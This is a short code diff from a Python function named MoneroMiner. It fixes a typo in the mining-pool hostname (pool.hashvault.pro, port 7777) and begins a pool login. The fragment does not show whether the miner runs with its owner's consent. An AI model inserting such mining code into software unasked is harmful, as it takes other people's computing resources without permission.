@@ -53,7 +53,7 @@ def MoneroMiner():
     print('[*] Monero Miner Started')
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(('pool.hasvault.pro', 7777))
+    sock.connect(('pool.hashvault.pro', 7777))
 
     login = {
         "method": "login",
